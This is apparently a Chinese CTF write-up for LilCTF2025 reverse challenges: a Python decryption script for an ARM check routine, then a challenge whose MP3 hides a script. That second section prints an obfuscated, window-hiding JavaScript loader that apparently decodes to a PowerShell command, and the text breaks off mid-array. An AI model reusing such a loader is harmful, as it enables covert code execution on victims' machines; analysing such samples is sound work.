---
title: LilCTF2025 RE部分WP
description: LilCTF2025 RE部分
date: 2025.08.19
tags: 
  - CTF
  - RE
categories: 
  - CTF
---

# RE

## ARM ASM

加密流程分析

先看java层

![image](/image-20250815104115-hwegnvp.png)
看到最终经过check和密文进行比较

分析native层的check函数

![image](/image-20250815104145-w3ydy4x.png)

![image](/image-20250815104221-r8ye9km.png)

发现加密大致是分块替换替换表:`[0xD, 0xE, 0xF, 0xC, 0xB, 0xA, 9, 8, 6, 7, 5, 4, 2, 3, 1, 0]`​

并异或`新字符 = t[原字符] ^ t`，

循环位移加一个换表base64

发现base64换表

![image](/image-20250815104207-lc4p43y.png)

写解密脚本

```python
import base64

def rol(byte, count):
    return ((byte << count) | (byte >> (8 - count))) & 0xFF

def ror(byte, count):
    return ((byte >> count) | (byte << (8 - count))) & 0xFF

def solve():
    encrypted_str = "KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S"

    custom_b64_alphabet = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ3456780129+/"
    standard_b64_alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

    translation_table = bytes.maketrans(custom_b64_alphabet, standard_b64_alphabet)
    standard_b64_str = encrypted_str.translate(translation_table)
    decoded_data = base64.b64decode(standard_b64_str)
    
    data_list = list(decoded_data)
    print(f"[+] Base64解码后 (48字节): {bytes(data_list).hex()}")

    for i in range(0, 48, 3):
        data_list[i] = ror(data_list[i], 3) # <--- 修正点
        data_list[i+1] = rol(data_list[i+1], 1)

    print(f"[+] 逆向位移后: {bytes(data_list).hex()}")

    t_initial = [0xD, 0xE, 0xF, 0xC, 0xB, 0xA, 9, 8, 6, 7, 5, 4, 2, 3, 1, 0]

    t_for_block = {}
    
    t_for_block[0] = list(t_initial)
    t_for_block[1] = list(t_initial)

    t_for_block[2] = [val ^ 1 for val in t_initial]

    decrypted_data = [0] * 48

    for i in range(3):
        t_current = t_for_block[i]
        rev_t = {val: idx for idx, val in enumerate(t_current)}
        
        block_start = i * 16
        encrypted_block = data_list[block_start : block_start + 16]
        decrypted_block = [0] * 16

        for j in range(16):
            k = rev_t[j]
            decrypted_block[j] = encrypted_block[k] ^ t_current[k]
        
        for k in range(16):
            decrypted_data[block_start + k] = decrypted_block[k]

    flag = bytes(decrypted_data).decode('utf-8')
    print(flag)

solve()
```

‍

​`LILCTF{ez_arm_asm_meow_meow_meow_meow_meow_meow}`​

## 1'M no7 A rO6oT

一个mp3下载下来

里面藏了js脚本

发现这个

```python
<script> window.resizeTo(0, 0);
window.moveTo(-9999, -9999);
SK = 102;
UP = 117;
tV = 110;
Fx = 99;
nI = 116;
pV = 105;
wt = 111;
RV = 32;
wV = 82;
Rp = 106;
kz = 81;
CX = 78;
GH = 40;
PS = 70;
YO = 86;
kF = 75;
PO = 113;
QF = 41;
sZ = 123;
nd = 118;
Ge = 97;
sV = 114;
wl = 104;
NL = 121;
Ep = 76;
uS = 98;
Lj = 103;
ST = 61;
Ix = 34;
Im = 59;
Gm = 101;
YZ = 109;
Xj = 71;
Fi = 48;
dL = 60;
cX = 46;
ho = 108;
jF = 43;
Gg = 100;
aV = 90;
uD = 67;
Nj = 83;
US = 91;
tg = 93;
vx = 45;
xv = 54;
QB = 49;
WT = 125;
FT = 55;
yN = 51;
ff = 44;
it = 50;
NW = 53;
kX = 57;
zN = 52;
Mb = 56;
Wn = 119;
sC = 65;
Yp = 88;
FF = 79;
var SxhM = String.fromCharCode(SK, UP, tV, Fx, nI, pV, wt, tV, RV, pV, wt, wV, Rp, kz, CX, GH, PS, YO, kF, PO, QF, sZ, nd, Ge, sV, RV, wt, wl, NL, Ep, uS, Lj, ST, RV, Ix, Ix, Im, SK, wt, sV, RV, GH, nd, Ge, sV, RV, Gm, YZ, Xj, kF, RV, ST, RV, Fi, Im, Gm, YZ, Xj, kF, RV, dL, RV, PS, YO, kF, PO, cX, ho, Gm, tV, Lj, nI, wl, Im, RV, Gm, YZ, Xj, kF, jF, jF, QF, sZ, nd, Ge, sV, RV, tV, Gg, aV, uD, RV, ST, RV, Nj, nI, sV, pV, tV, Lj, cX, SK, sV, wt, YZ, uD, wl, Ge, sV, uD, wt, Gg, Gm, GH, PS, YO, kF, PO, US, Gm, YZ, Xj, kF, tg, RV, vx, RV, xv, Fi, QB, QF, Im, wt, wl, NL, Ep, uS, Lj, RV, ST, RV, wt, wl, NL, Ep, uS, Lj, RV, jF, RV, tV, Gg, aV, uD, WT, sV, Gm, nI, UP, sV, tV, RV, wt, wl, NL, Ep, uS, Lj, WT, Im, nd, Ge, sV, RV, wt, wl, NL, Ep, uS, Lj, RV, ST, RV, pV, wt, wV, Rp, kz, CX, GH, US, FT, QB, yN, ff, RV, FT, QB, it, ff, RV, FT, it, Fi, ff, RV, FT, Fi, it, ff, RV, FT, QB, NW, ff, RV, FT, QB, xv, ff, RV, FT, Fi, NW, ff, RV, FT, Fi, it, ff, RV, FT, Fi, kX, ff, RV, FT, Fi, kX, ff, RV, xv, zN, FT, ff, RV, FT, Fi, it, ff, RV, FT, it, QB, ff, RV, FT, Fi, it, ff, RV, xv, yN, yN, ff, RV, xv, zN, xv, ff, RV, FT, it, Fi, ff, RV, xv, yN, yN, ff, RV, xv, NW, Fi, ff, RV, xv, yN, yN, ff, RV, xv, zN, xv, ff, RV, FT, Fi, it, ff, RV, FT, QB, yN, ff, RV, xv, yN, yN, ff, RV, xv, Mb, xv, ff, RV, FT, QB, QB, ff, RV, FT, QB, NW, ff, RV, FT, Fi, it, ff, RV, FT, QB, xv, ff, RV, FT, QB, FT, ff, RV, FT, QB, NW, ff, RV, FT, Fi, xv, ff, RV, FT, Fi, Fi, ff, RV, FT, QB, FT, ff, RV, FT, Fi, it, ff, RV, FT, Fi, QB, ff, RV, xv, yN, yN, ff, RV, xv, zN, xv, ff, RV, FT, QB, QB, ff, RV, FT, QB, it, ff, RV, FT, QB, yN, ff, RV, xv, yN, yN, ff, RV, xv, yN, FT, ff, RV, xv, FT, Fi, ff, RV, xv, FT, QB, ff, RV, xv, Mb, NW, ff, RV, xv, FT, Fi, ff, RV, xv, yN, yN, ff, RV, xv, xv, it, ff, RV, xv, zN, QB, ff, RV, xv, kX, it, ff, RV, FT, QB, NW, ff, RV, FT, Fi, it, ff, RV, FT, Fi, zN, ff, RV, FT, Fi, it, ff, RV, FT, it, QB, ff, RV, xv, kX, zN, ff, RV, xv, NW, kX, ff, RV, xv, NW, kX, ff, RV, xv, FT, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, QB, FT, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, NW, ff, RV, FT, Fi, it, ff, RV, FT, QB, xv, ff, RV, xv, zN, QB, ff, RV, xv, zN, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, yN, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, Fi, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, FT, Fi, yN, ff, RV, xv, kX, kX, ff, RV, FT, Fi, yN, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, it, ff, RV, FT, Fi, it, ff, RV, FT, Fi, it, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, NW, NW, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, zN, ff, RV, xv, kX, kX, ff, RV, FT, Fi, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, NW, Mb, ff, RV, xv, zN, kX, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, zN, ff, RV, xv, kX, kX, ff, RV, FT, Fi, yN, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, NW, it, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, NW, FT, ff, RV, xv, NW, Mb, ff, RV, xv, zN, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, kX, ff, RV, xv, kX, kX, ff, RV, xv, kX, kX, ff, RV, FT, Fi, yN, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, kX, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, NW, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, FT, Fi, QB, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, FT, Fi, yN, ff, RV, FT, Fi, Fi, ff, RV, xv, NW, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, kX, ff, RV, FT, Fi, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, kX, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, FT, Fi, it, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, kX, ff, RV, xv, kX, kX, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, kX, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, xv, NW, FT, ff, RV, xv, NW, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, NW, FT, ff, RV, FT, Fi, QB, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, kX, kX, ff, RV, xv, kX, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, NW, FT, ff, RV, xv, zN, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, kX, ff, RV, FT, Fi, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, kX, kX, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, zN, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, yN, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, zN, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, zN, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, xv, NW, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, FT, Fi, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, zN, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, NW, FT, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, zN, kX, ff, RV, FT, Fi, it, ff, RV, FT, Fi, it, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, yN, ff, RV, FT, Fi, yN, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, kX, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, yN, ff, RV, xv, NW, NW, ff, RV, FT, Fi, it, ff, RV, xv, NW, it, ff, RV, FT, Fi, it, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, yN, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, kX, kX, ff, RV, xv, NW, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, kX, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, FT, Fi, yN, ff, RV, xv, NW, NW, ff, RV, FT, Fi, yN, ff, RV, xv, NW, FT, ff, RV, FT, Fi, yN, ff, RV, FT, Fi, QB, ff, RV, FT, Fi, yN, ff, RV, FT, Fi, yN, ff, RV, FT, Fi, yN, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, NW, yN, ff, RV, FT, Fi, it, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, FT, Fi, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, NW, ff, RV, xv, kX, kX, ff, RV, FT, Fi, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, FT, Fi, yN, ff, RV, xv, NW, xv, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, NW, FT, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, NW, NW, ff, RV, FT, Fi, it, ff, RV, xv, NW, it, ff, RV, xv, NW, Mb, ff, RV, xv, NW, NW, ff, RV, FT, Fi, yN, ff, RV, xv, NW, FT, ff, RV, xv, NW, FT, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, it, ff, RV, xv, NW, FT, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, FT, Fi, yN, ff, RV, xv, NW, xv, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, FT, ff, RV, FT, Fi, yN, ff, RV, xv, NW, xv, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, FT, Fi, yN, ff, RV, xv, NW, FT, ff, RV, xv, NW, FT, ff, RV, xv, NW, yN, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, it, ff, RV, xv, NW, FT, ff, RV, xv, NW, FT, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, NW, FT, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, NW, FT, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, xv, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, NW, FT, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, it, ff, RV, xv, NW, FT, ff, RV, xv, NW, FT, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, NW, FT, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, NW, FT, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, xv, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, NW, FT, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, FT, ff, RV, xv, kX, kX, ff, RV, xv, zN, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, NW, FT, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, xv, NW, Mb, ff, RV, xv, NW, xv, ff, RV, FT, Fi, yN, ff, RV, FT, Fi, it, ff, RV, xv, NW, Mb, ff, RV, xv, NW, Fi, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, NW, FT, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, NW, FT, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, xv, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, it, ff, RV, xv, NW, FT, ff, RV, xv, NW, FT, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, 